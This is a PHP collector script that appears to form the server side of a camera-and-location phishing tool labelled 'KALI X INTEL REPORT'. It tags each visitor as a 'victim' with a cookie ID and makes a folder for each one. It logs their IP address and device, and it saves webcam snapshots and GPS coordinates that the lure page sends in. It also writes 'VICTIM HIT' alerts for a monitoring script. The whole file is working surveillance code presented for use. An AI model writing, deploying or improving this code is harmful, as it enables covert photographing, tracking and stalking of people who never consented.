<?php
date_default_timezone_set('UTC');

$ip = $_SERVER['REMOTE_ADDR'];

// --- RANDOM 6-DIGIT FOLDER LOGIC ---
// We check if a session/cookie exists so the same victim stays in the same folder
if (isset($_COOKIE['v_id'])) {
    $v_id = $_COOKIE['v_id'];
} else {
    $v_id = rand(100000, 999999);
    setcookie('v_id', $v_id, time() + (86400 * 30), "/"); 
}

$dir = "victim-" . $v_id;

if (!file_exists($dir)) {
    mkdir($dir, 0777, true);
}

$data = json_decode(file_get_contents('php://input'), true);
$info_path = $dir . '/INFO.txt';

// --- LOG DEVICE INFO ---
if (!file_exists($info_path)) {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $init_info = "--- KALI X INTEL REPORT ---\n";
    $init_info .= "ID: $v_id\n";
    $init_info .= "IP: $ip\n";
    $init_info .= "DEVICE: $user_agent\n";
    $init_info .= "TIME: " . date('d-m-Y H:i:s') . "\n";
    $init_info .= "---------------------------\n";
    file_put_contents($info_path, $init_info);
}

// --- HANDLE IMAGE ---
$img_key = isset($data['cat']) ? 'cat' : (isset($data['img']) ? 'img' : null);
if ($img_key) {
    $img = $data[$img_key];
    $img = preg_replace('#^data:image/\w+;base64,#i', '', $img);
    $img = str_replace(' ', '+', $img);
    $data_img = base64_decode($img);
    
    $file_name = $dir . '/snap_' . date('His') . '_' . rand(10, 99) . '.png';
    file_put_contents($file_name, $data_img);
}

// --- FIXED GOOGLE MAPS LINK ---
if (isset($data['lat']) && isset($data['lon'])) {
    $lat = $data['lat'];
    $lon = $data['lon'];
    
    // Generates a real, clickable URL
    $google_map = "https://www.google.com/maps?q=$lat,$lon";
    
    $gps_info = "[+] GPS LOCATION DETECTED\n";
    $gps_info .= "LAT: $lat | LON: $lon\n";
    $gps_info .= "LINK: $google_map\n";
    $gps_info .= "---------------------------\n";
    
    file_put_contents($info_path, $gps_info, FILE_APPEND);
}

// Bash monitor trigger
file_put_contents("ip.txt", "VICTIM-$v_id HIT\n", FILE_APPEND);
?>
